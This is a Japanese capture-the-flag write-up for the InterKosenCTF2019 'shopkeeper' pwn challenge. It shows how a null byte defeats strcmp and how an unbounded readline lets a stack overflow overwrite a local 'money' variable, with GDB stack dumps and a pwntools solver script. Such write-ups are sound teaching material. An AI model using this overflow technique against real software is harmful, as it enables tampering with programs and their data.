---
title: "shopkeeper - InterKosenCTF2019"
date: 2022-05-05T12:06:50+09:00
tags: ["pwn", "InterKosenCTF", "ptr-yudai's chall"]
draft: false
---

# 方針
`shop`関数内にある`money`という変数をStack Overflowによって書き換えて、
十分な`money`を手にして、`Hopes`を買う方法を取ります。

## 脆弱性を探す旅🐈
一つの脆弱性は、`readline`関数で無限に入力できることです。
```c
void readline(char *buf)
{
  char *ptr;

  for(ptr = buf; ; ++ptr) { // Vulnerable here 
    if (read(0, ptr, 1) == 0) break;
    if (*ptr == '\n') {
      *ptr = 0x00;
      break;
    }
  }
}
```
もう一つは、文字列比較で`strcmp`関数を使っていることです。


```c
void shop(item_t *inventory)
{
  char buf[LEN_NAME];
  item_t *p, *t;
  int money = 100;
```
また、`shop`関数の中で、`money`がローカル変数として定義されているので、
書き換えることができる場所を探します。

## `strcmp`関数は`'\0'`から比較しない
`shop`関数の中で呼ばれている`purchase`関数では、
文字列比較に、`strcmp`関数が使われていますが、
マニュアルを見ると、次のように書かれています。

```
strncmp() is designed for comparing strings rather than binary data,
characters that appear after a `\0' character are not compared.
```

この話は有名で、`'\0'`(NULL文字)のあとの文字列は比較しません。

## 変数をStack Overflowによって書き換え
ソースコードでは、`money = 100`で定義されています。
`100 = 0x64`なので、`money(100)`の部分は、`64`と表示されます。

スタックを見ると、0x7fffffffe4e0に`0x64`があります。
```bash
gef➤  x/20xg $rsp
0x7fffffffe4a0: 0x00007fffffffe4e0      0x00007fffffffe500
0x7fffffffe4b0: 0x0000007365706f48      0x00005555554009f5
0x7fffffffe4c0: 0x0000001900000000      0x0000555555401024
0x7fffffffe4d0: 0x00007fffffffe4f0      0x0000555555401041
0x7fffffffe4e0: 0x00000064ffffe4f0      0x0000000000000000 //←here
0x7fffffffe4f0: 0x00007fffffffe540      0x0000555555400e23
```

この`64`を書き換えたいので、入力からのオフセットを調べます。
またNULL文字を置くと、その先は比較されないので、BOFを起こすことが可能です。

キーボードから **NULL文字を打つ方法は`CTRL+@`** です。

```bash
gef➤  r
Starting program: /ctf/yu1hpa/InterKosenCTF2019-challenges-public/shopkeeper/distfiles/chall
* Hello, traveller.
* What would you like to buy?
 $25 - Cinnamon Bun
 $15 - Biscle
 $50 - Manly Bandanna
 $50 - Tough Glove
 $9999 - Hopes
> Hopes^@AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD

Breakpoint 1, 0x0000555555400d0f in shop ()
    （中略）
    
gef➤  x/20xg $rsp
0x7fffffffe4a0: 0x00007fffffffe4e0      0x00007fffffffe500
0x7fffffffe4b0: 0x4141007365706f48      0x4242414141414141
0x7fffffffe4c0: 0x4343424242424242      0x4444434343434343
0x7fffffffe4d0: 0x0000444444444444      0x0000555555401041
0x7fffffffe4e0: 0x00000064ffffe4f0      0x0000000000000000
0x7fffffffe4f0: 0x00007fffffffe540      0x0000555555400e23
```

`64`までのOFFSETを数えると、`46(0x2e)`です。
あとは、適当な文字列で書き換えると、
たくさんの`money`が手に入るので、`Hopes`を買うことができます。

# [Solver](https://github.com/yu1hpa/ctf-writeup/tree/master/2019/InterKosenCTF/shopkeeper)
```python
from pwn import *

file = "./chall"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)
io.sendlineafter("> ", b"Hopes\x00"+b"A"*0x2e+b"MONEY")
io.sendlineafter("> ", "Y")

io.interactive()
```
